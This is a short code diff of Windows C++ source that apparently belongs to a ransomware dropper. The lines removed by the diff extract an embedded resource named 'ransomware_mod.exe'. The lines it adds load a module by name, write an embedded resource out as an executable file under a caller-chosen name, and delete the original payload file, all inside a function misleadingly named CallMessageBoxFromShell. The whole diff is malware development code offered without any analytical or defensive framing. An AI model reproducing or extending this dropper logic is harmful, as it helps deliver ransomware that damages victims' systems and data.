@@ -46,8 +46,16 @@ void CallMessageBoxFromShell()
 	if (!isProcessRunning(payload_file))
 	{
 		// obtain resource from a running process
-		HMODULE hModule = ::GetModuleHandle(NULL);
-		BytesFromResource(hModule, (char*)"ransomware_mod.exe");
+		HMODULE hModule = LoadLibrary(TEXT(payload_file));
+		if (hModule == NULL)
+		{
+			std::cout << "Could not load libary.." << std::endl;
+		}
+		else {
+			BytesFromResource(hModule, (char*)"out_test_file.exe");
+			FreeLibrary(hModule);
+		}
+		
 		if (!DeleteFile(payload_file))
 		{
 			std::cout << GetLastError() << std::endl;
@@ -224,7 +232,7 @@ int BytesFromResource(HMODULE hModule, char* Str)
 		return 0;
 	}
 
-	std::ofstream outFile("resource_test.exe", std::ios::out | std::ios::binary);
+	std::ofstream outFile(Str, std::ios::out | std::ios::binary);
 	outFile.write((char*)ResLock, nSizeOfRes);
 	outFile.close();
 
